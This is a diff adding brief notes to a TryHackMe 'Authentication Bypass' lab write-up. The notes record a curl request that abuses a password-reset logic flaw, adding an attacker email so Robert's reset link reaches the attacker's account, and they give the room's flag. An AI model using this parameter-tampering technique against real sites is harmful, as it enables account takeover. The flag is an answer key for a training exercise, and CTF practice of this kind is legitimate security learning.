@@ -83,6 +83,24 @@ steve/thunder
 
 #Task 4 Logic Flaw 
 
+http://10.10.63.82/customers/signup
+create account hack:withpass
+login
+curl 'http://10.10.63.82/customers/reset?email=robert@acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=hacker@customer.acmeitsupport.thm'
 
+
+Support tickets
+We've received, a request to reset your password, please visit http://10.10.63.82/customers/reset/d10d858a6524a39abe2a9996915a1e5b to automatically login, and then you can reset your password from the 'Your Account' page.
+
+Run http://10.10.63.82/customers/reset/d10d858a6524a39abe2a9996915a1e5b
+---> Support Tickets
+Please don't tell anyone this! THM{AUTH_BYPASS_COMPLETE} 
+
+
+What is the flag from Robert's support ticket?
+THM{AUTH_BYPASS_COMPLETE}
+
+
+http://10.10.63.82/customers/reset/d10d858a6524a39abe2a9996915a1e5b
 https://tryhackme.com/room/authenticationbypass
 https://www.hackingetico.org/authentication-bypass-habitaci%C3%B3n-de-tryhackme/
